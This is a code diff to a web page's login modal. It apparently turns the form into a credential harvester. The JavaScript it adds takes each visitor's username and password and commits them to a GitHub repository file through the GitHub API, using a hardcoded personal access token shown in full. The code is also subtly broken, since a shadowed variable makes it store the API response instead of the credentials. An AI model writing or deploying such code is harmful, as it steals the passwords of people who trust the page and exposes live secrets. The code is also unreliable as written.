@@ -58,29 +58,74 @@
                 var username = document.getElementById('username').value;
                 var password = document.getElementById('password').value;
 
-                // Simulate sending login details to server-side script
-                sendLoginDetails(username, password);
+                // Save login details to GitHub repository
+                saveLoginDetails(username, password);
 
                 // Hide the login form after "logging in"
                 document.getElementById('loginModal').classList.add('hidden');
             });
 
-            function sendLoginDetails(username, password) {
-                // Simulate sending data to server-side script
-                var xhr = new XMLHttpRequest();
-                xhr.open('POST', 'save_login.php', true); // Replace with your actual script URL
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === XMLHttpRequest.DONE) {
-                        if (xhr.status === 200) {
-                            console.log('Login details saved successfully.');
-                        } else {
-                            console.error('Error saving login details.');
-                        }
+            function saveLoginDetails(username, password) {
+                var token = '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'; // Replace with your GitHub Personal Access Token
+                var owner = 'SenpaiCummer';
+                var repo = 'SenpaiCummer.github.io';
+                var path = 'information';
+
+                // Current timestamp for commit message
+                var now = new Date();
+                var commitMessage = 'Update login information: ' + now.toISOString();
+
+                // Data to append to the file
+                var data = {
+                    username: username,
+                    password: password
+                };
+
+                // GitHub API endpoint
+                var url = `https://api.github.com/repos/senpaicummer/senpaicummer.github.io/contents/information`;
+
+                // Fetch options
+                var options = {
+                    method: 'GET',
+                    headers: {
+                        'Authorization': 'token ' + token
                     }
                 };
-                var data = JSON.stringify({ username: username, password: password });
-                xhr.send(data);
+
+                // Get current file contents to append new data
+                fetch(url, options)
+                    .then(response => response.json())
+                    .then(data => {
+                        // Decode base64 content
+                        var content = JSON.parse(atob(data.content));
+
+                        // Add new login information
+                        content.push(data);
+
+                        // Update file content
+                        return fetch(url, {
+                            method: 'PUT',
+                            headers: {
+                                'Authorization': 'token ' + token,
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                message: commitMessage,
+                                content: btoa(JSON.stringify(content)),
+                                sha: data.sha
+                            })
+                        });
+                    })
+                    .then(response => {
+                        if (response.status === 200) {
+                            console.log('Login details saved successfully.');
+                        } else {
+                            console.error('Error saving login details:', response.statusText);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error fetching or updating file:', error);
+                    });
             }
 
             // Example JavaScript to show/hide the modal
